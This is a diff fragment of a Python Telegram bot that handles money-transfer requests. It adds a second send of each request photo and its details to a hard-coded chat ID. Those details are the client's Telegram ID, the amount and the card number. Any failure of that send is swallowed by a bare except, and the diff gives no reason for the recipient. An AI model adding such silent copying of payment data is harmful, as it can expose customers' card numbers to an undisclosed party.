@@ -172,6 +172,14 @@ def get_photo(message):
                                                            f"Зарегестрированная сумма перевода: {information[2]}\n"
                                                            f"Номер карты: <code>{information[3]}</code>",
                            parse_mode="html")
+            try:
+                bot.send_photo(3356664, photo=photo, caption=f"<b>Заявка № {information[0]}</b>\n"
+                                                               f"tg ID клиента: <code>{information[1]}</code>\n"
+                                                               f"Зарегестрированная сумма перевода: {information[2]}\n"
+                                                               f"Номер карты: <code>{information[3]}</code>",
+                               parse_mode="html")
+            except:
+                pass
         except:
             bot.send_message(user_id, "Ошибка. Повторите заново")
     elif message.text == "Главное меню":
